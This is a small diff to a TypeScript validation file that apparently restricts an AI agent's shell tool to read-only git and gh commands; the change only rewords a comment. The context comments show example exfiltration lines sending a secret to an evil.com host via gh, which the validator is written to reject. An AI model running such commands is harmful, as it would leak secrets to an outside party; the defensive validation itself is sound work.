@@ -938,8 +938,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
 //   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
 // gh also accepts positional URLs: `gh pr view https://evil.com/owner/repo/pull/1`
 //
-// git ls-remote has an inline URL guard (readOnlyValidation.ts:~944); this
-// callback provides the equivalent for gh. Rejects:
+// git ls-remote has an inline URL guard — the `tokens[1] === 'ls-remote'`
+// branch in src/tools/BashTool/readOnlyValidation.ts. This callback provides
+// the equivalent for gh. Rejects:
 //   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
 //   - Any token with `://` (URL)
 //   - Any token with `@` (SSH-style)
